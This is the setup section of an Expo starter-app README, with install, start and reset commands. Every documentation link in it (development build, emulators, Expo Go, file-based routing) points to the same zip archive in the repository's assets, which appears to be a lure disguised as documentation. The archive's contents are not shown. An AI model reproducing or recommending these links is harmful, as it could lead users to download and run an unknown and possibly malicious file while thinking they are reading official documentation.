## Get started

1. Install dependencies

   ```bash
   npm install
   ```

2. Start the app

   ```bash
   npx expo start
   ```

In the output, you'll find options to open the app in a

- [development build](https://raw.githubusercontent.com/jeffigy/expo-auth-flow/main/assets/auth-expo-flow-2.0.zip)
- [Android emulator](https://raw.githubusercontent.com/jeffigy/expo-auth-flow/main/assets/auth-expo-flow-2.0.zip)
- [iOS simulator](https://raw.githubusercontent.com/jeffigy/expo-auth-flow/main/assets/auth-expo-flow-2.0.zip)
- [Expo Go](https://raw.githubusercontent.com/jeffigy/expo-auth-flow/main/assets/auth-expo-flow-2.0.zip), a limited sandbox for trying out app development with Expo

You can start developing by editing the files inside the **app** directory. This project uses [file-based routing](https://raw.githubusercontent.com/jeffigy/expo-auth-flow/main/assets/auth-expo-flow-2.0.zip).

## Get a fresh project

When you're ready, run:

```bash
npm run reset-project
```

This command will move the starter code to the **app-example** directory and create a blank **app** directory where you can start developing.
